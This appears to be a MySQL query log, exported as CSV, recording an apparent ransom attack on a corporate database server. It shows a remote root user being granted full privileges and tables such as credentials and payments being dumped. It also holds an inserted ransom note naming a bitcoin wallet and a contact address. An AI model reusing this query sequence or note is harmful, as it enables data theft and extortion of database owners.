"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:52.047153Z    52 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:52.819212Z    53 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query, SELECT * FROM `city`,2026-09-01T20:27:52.231012Z    52 Query SELECT * FROM `city`
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:52.138773Z    52 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:51 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:51.359675Z    51 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:51 PM",datafiles-corp-s01,Query, SELECT * FROM `category`,2026-09-01T20:27:51.552816Z    51 Query SELECT * FROM `category`
"Sep 1, 2026 4:27:51 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:51.454330Z    51 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:50 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:50.438262Z    50 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:50 PM",datafiles-corp-s01,Query, SELECT * FROM `address`,2026-09-01T20:27:50.633878Z    50 Query SELECT * FROM `address`
"Sep 1, 2026 4:27:50 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:50.533426Z    50 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:49 PM",datafiles-corp-s01,Query, SELECT * FROM `actor_info`,2026-09-01T20:27:49.225914Z    49 Query SELECT * FROM `actor_info`
"Sep 1, 2026 4:27:49 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:49.130332Z    49 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:49 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:49.036619Z    49 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:48.427896Z    48 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query, SELECT * FROM `actor`,2026-09-01T20:27:48.521688Z    48 Query SELECT * FROM `actor`
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:27:47.881611Z    47 Query SHOW tables
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:48.336507Z    48 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:47.605237Z    47 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:47.118286Z    46 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:47.025581Z    46 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila',2026-09-01T20:27:47.695861Z    47 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila'
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SELECT * FROM `recover_your_data`,2026-09-01T20:27:47.213022Z    46 Query SELECT * FROM `recover_your_data`
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, USE `sakila`,2026-09-01T20:27:47.790275Z    47 Query USE `sakila`
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:27:46.569794Z    45 Query SHOW tables
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data',2026-09-01T20:27:46.379780Z    45 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data'
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:46.287275Z    45 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, USE `recover_your_data`,2026-09-01T20:27:46.477358Z    45 Query USE `recover_your_data`
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:45.916287Z    44 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:45 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:45.143207Z    42 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:45 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:45.545402Z    43 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:44 PM",datafiles-corp-s01,Query, SELECT * FROM `payments`,2026-09-01T20:27:44.470631Z    41 Query SELECT * FROM `payments`
"Sep 1, 2026 4:27:44 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:44.367018Z    41 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:44 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:44.273853Z    41 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:43 PM",datafiles-corp-s01,Query, SELECT * FROM `orders`,2026-09-01T20:27:43.601113Z    40 Query SELECT * FROM `orders`
"Sep 1, 2026 4:27:43 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:43.413116Z    40 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:43 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:43.506521Z    40 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:42 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:42.451796Z    39 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:42 PM",datafiles-corp-s01,Query, SELECT * FROM `customers`,2026-09-01T20:27:42.642814Z    39 Query SELECT * FROM `customers`
"Sep 1, 2026 4:27:42 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:42.546361Z    39 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'cr_corp_01',2026-09-01T20:27:40.943358Z    37 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'cr_corp_01'
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SELECT * FROM `credentials`,2026-09-01T20:27:41.839780Z    38 Query SELECT * FROM `credentials`
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:41.743902Z    38 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:41.646302Z    38 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:27:41.127868Z    37 Query SHOW tables
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, USE `cr_corp_01`,2026-09-01T20:27:41.037515Z    37 Query USE `cr_corp_01`
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query," GRANT CREATE, DROP ON *.* TO `root`@`%`","2026-09-01T20:27:40.478053Z    36 Query GRANT CREATE, DROP ON *.* TO `root`@`%`"
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:39.919017Z    35 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:40.851643Z    37 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:40.378926Z    36 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T20:27:40.009963Z    35 Query SHOW DATABASES
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-09-01T20:27:39.367631Z    34 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:27:38.864502Z    34 Query COMMIT
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, USE RECOVER_YOUR_DATA,2026-09-01T20:27:38.954868Z    34 Query USE RECOVER_YOUR_DATA
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:27:39.551659Z    34 Query COMMIT
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1'),2026-09-01T20:27:39.461168Z    34 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1')
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-09-01T20:27:39.140054Z    34 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:27:39.276288Z    34 Query COMMIT
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, SHOW TABLES,2026-09-01T20:27:39.045898Z    34 Query SHOW TABLES
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-01T20:27:38.761611Z    34 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:38.199073Z    33 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T20:27:38.290404Z    33 Query SHOW DATABASES
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:38.670759Z    34 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:37 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:37.822594Z    32 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:32 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:32.179035Z    30 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:54:04 AM",datafiles-corp-s01,Query, CREATE USER 'root'@'%' IDENTIFIED BY <secret>,2026-09-01T15:54:04.618169Z    21 Query CREATE USER 'root'@'%' IDENTIFIED BY <secret>
"Sep 1, 2026 11:54:04 AM",datafiles-corp-s01,Query, FLUSH PRIVILEGES,2026-09-01T15:54:04.676842Z    21 Query FLUSH PRIVILEGES
"Sep 1, 2026 11:54:04 AM",datafiles-corp-s01,Query, GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION,2026-09-01T15:54:04.666974Z    21 Query GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show variables,2026-09-01T15:53:54.232004Z    21 Query show variables
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show charset,2026-09-01T15:53:54.229863Z    21 Query show charset
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'interactive_timeout',2026-09-01T15:53:54.247687Z    21 Query SHOW SESSION VARIABLES LIKE 'interactive_timeout'
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show engines,2026-09-01T15:53:54.229546Z    21 Query show engines
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show collation,2026-09-01T15:53:54.230347Z    21 Query show collation
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T15:53:54.227598Z    20 Query SHOW DATABASES
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'version_compile_os',2026-09-01T15:53:54.233652Z    21 Query SHOW SESSION VARIABLES LIKE 'version_compile_os'
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'wait_timeout',2026-09-01T15:53:54.246477Z    21 Query SHOW SESSION VARIABLES LIKE 'wait_timeout'
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'offline_mode',2026-09-01T15:53:54.234634Z    21 Query SHOW SESSION VARIABLES LIKE 'offline_mode'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION STATUS LIKE 'Ssl_cipher',2026-09-01T15:53:53.842128Z    20 Query SHOW SESSION STATUS LIKE 'Ssl_cipher'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT current_user(),2026-09-01T15:53:53.835649Z    20 Query SELECT current_user()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION STATUS LIKE 'Ssl_cipher',2026-09-01T15:53:53.875529Z    21 Query SHOW SESSION STATUS LIKE 'Ssl_cipher'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET SQL_SAFE_UPDATES=1,2026-09-01T15:53:53.872418Z    21 Query SET SQL_SAFE_UPDATES=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, show character set where charset = 'utf8mb4',2026-09-01T15:53:53.840544Z    20 Query show character set where charset = 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT CONNECTION_ID(),2026-09-01T15:53:53.840364Z    20 Query SELECT CONNECTION_ID()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'version',2026-09-01T15:53:53.894090Z    21 Query SHOW SESSION VARIABLES LIKE 'version'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT current_user(),2026-09-01T15:53:53.895758Z    21 Query SELECT current_user()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES utf8,2026-09-01T15:53:53.872010Z    21 Query SET NAMES utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT current_user(),2026-09-01T15:53:53.849066Z    21 Query SELECT current_user()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'lower_case_table_names',2026-09-01T15:53:53.895944Z    21 Query SHOW SESSION VARIABLES LIKE 'lower_case_table_names'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'version_comment',2026-09-01T15:53:53.892641Z    21 Query SHOW SESSION VARIABLES LIKE 'version_comment'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'sql_mode',2026-09-01T15:53:53.876892Z    21 Query SHOW SESSION VARIABLES LIKE 'sql_mode'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES 'utf8mb4',2026-09-01T15:53:53.841269Z    20 Query SET NAMES 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES utf8,2026-09-01T15:53:53.837120Z    20 Query SET NAMES utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES 'utf8mb4',2026-09-01T15:53:53.875310Z    21 Query SET NAMES 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.848846Z    21 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.834729Z    20 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET CHARACTER SET utf8,2026-09-01T15:53:53.836921Z    20 Query SET CHARACTER SET utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, show character set where charset = 'utf8mb4',2026-09-01T15:53:53.872878Z    21 Query show character set where charset = 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.843192Z    20 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET CHARACTER SET utf8,2026-09-01T15:53:53.849252Z    21 Query SET CHARACTER SET utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'sql_mode',2026-09-01T15:53:53.837481Z    20 Query SHOW SESSION VARIABLES LIKE 'sql_mode'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.876683Z    21 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT CONNECTION_ID(),2026-09-01T15:53:53.872635Z    21 Query SELECT CONNECTION_ID()